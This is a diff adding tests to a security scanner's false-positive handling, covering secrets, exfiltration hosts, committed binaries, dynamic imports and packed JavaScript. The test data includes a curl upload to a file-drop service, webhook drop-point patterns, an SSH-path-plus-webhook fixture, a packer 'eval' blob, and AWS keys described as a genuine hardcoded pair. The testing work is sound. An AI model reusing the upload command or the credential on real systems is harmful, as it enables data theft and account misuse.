@@ -7357,3 +7357,397 @@ class TestATriggerIsAKeyAndNotAString:
         """The control, four ways. YAML gives a trigger list three syntaxes and the rule
         has to read all of them, or the narrowing is an escape hatch."""
         assert "SUSPECT.CI.PR_TARGET.001" in self._write(tmp_path, trigger)
+
+
+class TestAttributeOnAFieldNotOnAModule:
+    """`#[cfg(test)]` is legal on anything, and `atuinsh/atuin` puts it on a struct field:
+    every entry in its redaction table carries a list of sample credentials to redact.
+
+    The span ran from the attribute to the first `{`, which in
+    `tests: &[Test { ... }, Test { ... }]` is the brace of the FIRST element -- so a
+    second sample in the same list fell outside the span and was reported, and a GitHub
+    PAT the author had expired came out at CRITICAL.
+    """
+
+    @staticmethod
+    def _spans(source: str) -> list[tuple[int, int]]:
+        from cordon_scanner.detect.secrets import test_module_spans
+
+        return [(a, b) for a, b in test_module_spans(source)]
+
+    def test_the_second_element_of_a_list_is_inside(self) -> None:
+        source = (
+            "static P: &[Pattern] = &[Pattern {\n"
+            '    name: "GitHub PAT",\n'
+            "    #[cfg(test)]\n"
+            "    tests: &[\n"
+            '        Test { input: "first" },\n'
+            '        Test { input: "second" },\n'
+            "    ],\n"
+            "}];\n"
+        )
+        second = source.index('"second"')
+        assert any(a <= second < b for a, b in self._spans(source))
+
+    def test_a_module_still_ends_at_its_brace(self) -> None:
+        """The shape the first draft was written for, asserted from the other side: the
+        span must not run past the module into the code below it."""
+        source = '#[cfg(test)]\nmod tests {\n    const K: &str = "x";\n}\n\nfn live() {}\n'
+        after = source.index("fn live")
+        assert not any(a <= after < b for a, b in self._spans(source))
+
+    def test_an_attribute_on_a_statement_ends_at_the_semicolon(self) -> None:
+        source = '#[cfg(test)]\nuse super::*;\n\nconst LIVE: &str = "y";\n'
+        live = source.index('"y"')
+        assert not any(a <= live < b for a, b in self._spans(source))
+
+    def test_a_second_attribute_does_not_become_the_item(self) -> None:
+        """`#[cfg(test)]` then `#[derive(Debug)]`: the first bracket belongs to the
+        derive, and stopping there would make the span the attribute and not the
+        module."""
+        source = '#[cfg(test)]\n#[derive(Debug)]\nmod tests {\n    const K: &str = "z";\n}\n'
+        inner = source.index('"z"')
+        assert any(a <= inner < b for a, b in self._spans(source))
+
+
+class TestARustTestModuleIsNotACapability:
+    """The span above was only ever consulted by the secrets detector. `Hmbown/Codewhale`
+    builds a fleet-host fixture in a `#[cfg(test)]` module -- an SSH identity path and a
+    Slack webhook in the same block -- and the pair was reported as credential access
+    beside a drop point, because the capability detector had no idea the module was tests.
+    """
+
+    FIXTURE: ClassVar[str] = (
+        "pub fn live() -> u8 {\n    7\n}\n\n"
+        "#[cfg(test)]\nmod tests {\n"
+        "    use super::*;\n\n"
+        "    #[test]\n"
+        "    fn round_trip() {\n"
+        '        let identity = "~/.ssh/codewhale_fleet";\n'
+        '        let hook = "https://hooks.slack.com/services/T0/B0/xxxx";\n'
+        "        assert_eq!(live(), 7);\n"
+        "    }\n"
+        "}\n"
+    )
+
+    def test_a_fixture_in_a_test_module_is_not_a_drop_point(self, tmp_path) -> None:
+        crate = tmp_path / "crates" / "protocol"
+        (crate / "src").mkdir(parents=True)
+        (tmp_path / "Cargo.toml").write_text('[workspace]\nmembers = ["crates/protocol"]\n')
+        (crate / "Cargo.toml").write_text('[package]\nname = "protocol"\nversion = "0.1.0"\n')
+        (crate / "src" / "fleet.rs").write_text(self.FIXTURE)
+        assert "SUSPECT.EXFIL.DROP_POINT.001" not in flagged(tmp_path)
+
+    def test_the_same_pair_outside_the_module_still_is(self, tmp_path) -> None:
+        """The control. Nothing changed but the four lines that put it in the tests."""
+        crate = tmp_path / "crates" / "protocol"
+        (crate / "src").mkdir(parents=True)
+        (crate / "Cargo.toml").write_text('[package]\nname = "protocol"\nversion = "0.1.0"\n')
+        (crate / "src" / "fleet.rs").write_text(
+            "pub fn ship() {\n"
+            '    let identity = "~/.ssh/codewhale_fleet";\n'
+            '    let hook = "https://hooks.slack.com/services/T0/B0/xxxx";\n'
+            "    post(hook, identity);\n"
+            "}\n"
+        )
+        assert "SUSPECT.EXFIL.DROP_POINT.001" in flagged(tmp_path)
+
+
+class TestAHostIsNotASubstring:
+    """`vllm` imports `vllm.distributed.weight_transfer.sharded_rdt_common`, and a module
+    path that long contains `transfer.sh` in the middle of it. Every file importing it was
+    reported as contacting a file-drop service, which put three of them one capability
+    short of an exfiltration finding.
+
+    A host has boundaries. On the left, anything but a letter, digit, `_` or `-` -- a dot
+    is allowed, because a subdomain of a drop point is the drop point. On the right, only
+    for the bare-host entries: a path-qualified one is followed by the rest of the URL,
+    and `api.telegram.org/bot` is followed by a token that starts with digits.
+    """
+
+    @staticmethod
+    def _hit(raw: bytes) -> str | None:
+        from cordon_scanner.intel.hosts import destination_matcher
+
+        found = destination_matcher().search(raw)
+        return found.group(0).decode() if found else None
+
+    @pytest.mark.parametrize(
+        "raw",
+        [
+            b"from vllm.distributed.weight_transfer.sharded_rdt_common import check",
+            b"const url = 'https://transfer.shop/catalogue';",
+            b"import { hooksSlackComClient } from './x';",
+        ],
+    )
+    def test_a_host_inside_a_longer_name_is_not_that_host(self, raw: bytes) -> None:
+        assert self._hit(raw) is None
+
+    @pytest.mark.parametrize(
+        ("raw", "expected"),
+        [
+            (b"curl -F file=@x https://transfer.sh/", "transfer.sh"),
+            (b"https://media.discord.com/api/webhooks/1/x", "discord.com/api/webhooks"),
+            (
+                b"https.request({hostname: 'hooks.slack.com', path: '/services/T/B/x'})",
+                "hooks.slack.com",
+            ),
+            (b"https://api.telegram.org/bot8012345:AAExample/sendMessage", "api.telegram.org/bot"),
+        ],
+    )
+    def test_the_real_shapes_still_match(self, raw: bytes, expected: str) -> None:
+        """The control, including the two the boundaries could plausibly have broken: a
+        subdomain on the left and a bot token on the right."""
+        assert self._hit(raw) == expected
+
+
+class TestAPlatformApiIsNotAWebhookIngest:
+    """`WEBHOOK_ONLY_HOSTS` said its members serve nothing but webhook ingest. That was
+    true of `hooks.slack.com`, a subdomain Slack dedicates to it, and false of the three
+    others: `open.feishu.cn`, `oapi.dingtalk.com` and `qyapi.weixin.qq.com` are each the
+    whole of a platform's open API, and the webhook is one path on it.
+
+    All three were already listed in their path-qualified form, which is the treatment
+    `discord.com` gets and for the same stated reason. The bare entries cost three false
+    drop points in a thirty-six repository sample, each a project integrating with the
+    platform it says it integrates with.
+    """
+
+    @staticmethod
+    def _hit(raw: bytes) -> str | None:
+        from cordon_scanner.intel.hosts import destination_matcher
+
+        found = destination_matcher().search(raw)
+        return found.group(0).decode() if found else None
+
+    @pytest.mark.parametrize(
+        "raw",
+        [
+            b"access_token_url='https://open.feishu.cn/open-apis/authen/v2/oauth/token'",
+            b"url = 'https://oapi.dingtalk.com/gettoken?appkey=' + key",
+            b"GET https://qyapi.weixin.qq.com/cgi-bin/user/list?department_id=1",
+        ],
+    )
+    def test_the_platforms_own_api_is_not_a_drop_point(self, raw: bytes) -> None:
+        assert self._hit(raw) is None
+
+    @pytest.mark.parametrize(
+        "raw",
+        [
+            b"post('https://open.feishu.cn/open-apis/bot/v2/hook/abc-def')",
+            b"post('https://oapi.dingtalk.com/robot/send?access_token=x')",
+            b"post('https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=x')",
+        ],
+    )
+    def test_the_webhook_path_on_each_still_does(self, raw: bytes) -> None:
+        """The control, and the whole reason the bare entries could go."""
+        assert self._hit(raw) is not None
+
+
+class TestABodyThatDecodesToASentence:
+    """`Significant-Gravitas/AutoGPT` vendors Supabase's self-host compose file, and one
+    line carries a Stripe-shaped webhook secret whose base64 body decodes to a sentence
+    announcing itself an example of a shorter base64 string.
+
+    The claim is about randomness and not about the wording: a real secret is random
+    bytes, random bytes are printable ASCII about a third of the time each, and a body
+    that decodes to words and spaces all the way through is not random.
+    """
+
+    @staticmethod
+    def _decodes(body: str) -> bool:
+        from cordon_scanner.detect.secrets import decodes_to_prose
+
+        return decodes_to_prose(body.encode())
+
+    def test_a_sentence_is_not_a_secret(self) -> None:
+        import base64
+
+        sentence = b"This is an example of a shorter Base64 string"
+        assert self._decodes("whsec_" + base64.b64encode(sentence).decode())
+
+    @pytest.mark.parametrize(
+        "body",
+        [
+            "whsec_4eC39HqLyjWDarjtT1zdp7dc8kfYTuRgBiYa15BLrx8etQoX",
+            "whsec_UpNVntn3cDxHJpq99YMc1T1AQgQpc8kf",
+            "whsec_short",
+        ],
+    )
+    def test_a_random_body_is_not_prose(self, body: str) -> None:
+        """The control. Two random bodies and one too short to mean anything either way."""
+        assert not self._decodes(body)
+
+
+class TestAnAccessKeyIdIsNotACredential:
+    """`rust-lang/rust` commits two AWS access key ids in `src/ci/github-actions/jobs.yml`
+    with a comment above explaining the scheme: the ids are in the repository so a key can
+    be rotated on one branch while another keeps the old one, and the secrets live in the
+    CI provider's store. An id is the public name of a credential.
+
+    So this grades rather than dismisses. An id still identifies an account and is worth
+    seeing; it is not the emergency a usable pair is, and reporting it at the same
+    severity is what makes a reader stop reading.
+    """
+
+    @staticmethod
+    def _aws(tmp_path, text: str) -> list:
+        (tmp_path / "jobs.yml").write_text(text)
+        return [
+            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SECRET.AWS.ACCESS_KEY.001"
+        ]
+
+    def test_an_id_on_its_own_is_graded_down(self, tmp_path) -> None:
+        key = assemble("AKIA", "46X5W6CZI5DHEBFL")
+        found = self._aws(tmp_path, f"env:\n  CACHES_AWS_ACCESS_KEY_ID: {key}\n")
+        assert len(found) == 1
+        assert found[0].severity <= Severity.MEDIUM
+        assert "cannot authenticate" in found[0].message
+
+    def test_the_pair_is_reported_in_full(self, tmp_path) -> None:
+        """The control. `yt-dlp` hardcodes a genuine pair a line apart."""
+        key = assemble("AKIA", "I6X4TYCIXM2B7MUQ")
+        found = self._aws(
+            tmp_path,
+            f"access_key: {key}\nsecret_key: 4WUUJWuFvtTkXbhaWTDv7MhO+0LqoYDWfEnUXoWn\n",
+        )
+        assert len(found) == 1
+        assert found[0].severity >= Severity.HIGH
+
+
+class TestAWasmModuleCannotBeRunByAHook:
+    """`SUSPECT.BINARY.EXECUTABLE_PATH.001` says an executable "sits where a lifecycle step
+    will run it". A `.wasm` has no entry point an operating system or a shell can start:
+    it is instantiated by a host runtime somebody has to write. `excalidraw` keeps
+    `scripts/wasm/hb-subset.wasm`, the HarfBuzz subsetter its font pipeline calls from
+    JavaScript.
+
+    And a `scripts/` seven directories inside `src/` is a module of the program rather
+    than the lifecycle directory a package manager looks in: `microsoft/vscode` ships
+    PowerShell's PSReadLine module under
+    `src/vs/workbench/contrib/terminal/common/scripts/psreadline/`.
+
+    Neither stops being reported. Both still emit `POLICY.BINARY.COMMITTED.001`, which is
+    the true statement about them.
+    """
+
+    WASM: ClassVar[bytes] = b"\x00asm\x01\x00\x00\x00" + b"\x00" * 64
+    ELF_BIN: ClassVar[bytes] = b"\x7fELF" + b"\x00" * 64
+
+    @staticmethod
+    def _at(tmp_path, relative: str, raw: bytes) -> set[str]:
+        target = tmp_path / relative
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_bytes(raw)
+        return {f.rule_id for f in Scanner().scan(tmp_path).findings}
+
+    def test_a_wasm_under_scripts_is_only_a_committed_binary(self, tmp_path) -> None:
+        rules = self._at(tmp_path, "scripts/wasm/hb-subset.wasm", self.WASM)
+        assert "SUSPECT.BINARY.EXECUTABLE_PATH.001" not in rules
+        assert "POLICY.BINARY.COMMITTED.001" in rules
+
+    def test_a_scripts_directory_inside_src_is_part_of_the_source(self, tmp_path) -> None:
+        rules = self._at(
+            tmp_path, "src/vs/workbench/contrib/terminal/common/scripts/ps/mod.dll", self.ELF_BIN
+        )
+        assert "SUSPECT.BINARY.EXECUTABLE_PATH.001" not in rules
+        assert "POLICY.BINARY.COMMITTED.001" in rules
+
+    def test_an_executable_in_the_lifecycle_directory_still_reports(self, tmp_path) -> None:
+        """The control, twice: the rule is about a real executable in the real place."""
+        assert "SUSPECT.BINARY.EXECUTABLE_PATH.001" in self._at(
+            tmp_path, "scripts/helper", self.ELF_BIN
+        )
+        assert "SUSPECT.BINARY.EXECUTABLE_PATH.001" in self._at(
+            tmp_path, "packages/server/scripts/postinstall-helper", self.ELF_BIN
+        )
+
+
+class TestSixNamesAreNotAComputedName:
+    """`odysseus` ends its `setup.py` with a dependency check -- a loop over a literal list
+    of six module names, calling `__import__` on each inside a `try` -- and it was reported
+    at CRITICAL as install-time code reaching a function by a name that cannot be read
+    from the file. All six names are written out two lines above.
+
+    The AST tier exists to resolve what is constant-derivable. A loop variable bound to a
+    list of string literals is derivable: reading the file is reading every value it can
+    take. A list built anywhere else is not followed, because the next thing to follow
+    would be a list that is appended to, and then one built from a response.
+    """
+
+    @staticmethod
+    def _dispatch(source: str) -> list:
+        from cordon_scanner.core.models import Capability
+        from cordon_scanner.detect.pyast import PythonAnalyzer
+
+        return [
+            h for h in PythonAnalyzer.analyse(source) if h.capability is Capability.DYNAMIC_DISPATCH
+        ]
+
+    PROBE: ClassVar[str] = (
+        "def check_deps():\n"
+        "    missing = []\n"
+        '    for mod in ["fastapi", "uvicorn", "sqlalchemy", "bcrypt", "httpx", "dotenv"]:\n'
+        "        try:\n"
+        "            __import__(mod)\n"
+        "        except ImportError:\n"
+        "            missing.append(mod)\n"
+    )
+
+    def test_an_enumerated_name_is_not_dynamic(self) -> None:
+        assert self._dispatch(self.PROBE) == []
+
+    def test_the_whole_file_is_silent_about_it(self, tmp_path) -> None:
+        (tmp_path / "setup.py").write_text("import os\n\n" + self.PROBE)
+        assert "MALWARE.DYNAMIC_DISPATCH.001" not in flagged(tmp_path)
+
+    @pytest.mark.parametrize(
+        "source",
+        [
+            "name = fetch()\n__import__(name).run()\n",
+            "for mod in fetch_list():\n    __import__(mod)\n",
+            "for mod in MODULES:\n    __import__(mod)\n",
+        ],
+    )
+    def test_a_name_from_anywhere_else_still_is(self, source: str) -> None:
+        """The control, three ways -- including a loop whose list is a NAME, which is
+        where following one more step would start down a road with no end."""
+        assert self._dispatch(source)
+
+
+class TestACommentedOutPackerIsNotPackedCode:
+    """`binary-husky/gpt_academic` keeps a Dean Edwards packer preamble behind a `//` in
+    `themes/waifu_plugin/waifu-tips.js`, where an author left the packed form of a widget
+    beside the readable one.
+
+    This rule's claim is that obfuscated code cannot be reviewed. A commented-out blob is
+    not code, and the readable version is on the next line. The obfuscation detector was
+    the only one in the tool with no comment test at all.
+    """
+
+    PACKED: ClassVar[str] = (
+        "eval(function(p,a,c,k,e,r){e=function(c){return c};"
+        "return p}('0 1',2,2,'var|x'.split('|'),0,{}))"
+    )
+
+    @staticmethod
+    def _rules(tmp_path, text: str) -> set[str]:
+        (tmp_path / "widget.js").write_text(text)
+        return {f.rule_id for f in Scanner().scan(tmp_path).findings}
+
+    def test_behind_a_line_comment_it_is_not_reported(self, tmp_path) -> None:
+        body = "\n".join(f"// {self.PACKED}" for _ in range(4))
+        assert "SUSPECT.OBFUSCATION.PACKED.001" not in self._rules(
+            tmp_path, body + "\nvar x = 1;\n"
+        )
+
+    def test_the_same_blob_as_code_is(self, tmp_path) -> None:
+        """The control, and the reason the test is per-occurrence rather than per-file."""
+        body = "\n".join(self.PACKED for _ in range(4))
+        assert "SUSPECT.OBFUSCATION.PACKED.001" in self._rules(tmp_path, body + "\n")
+
+    def test_a_comment_above_real_packed_code_does_not_excuse_it(self, tmp_path) -> None:
+        """The evasion the per-occurrence form must not open: commenting out the first
+        copy while shipping the rest."""
+        body = f"// {self.PACKED}\n" + "\n".join(self.PACKED for _ in range(4))
+        assert "SUSPECT.OBFUSCATION.PACKED.001" in self._rules(tmp_path, body + "\n")
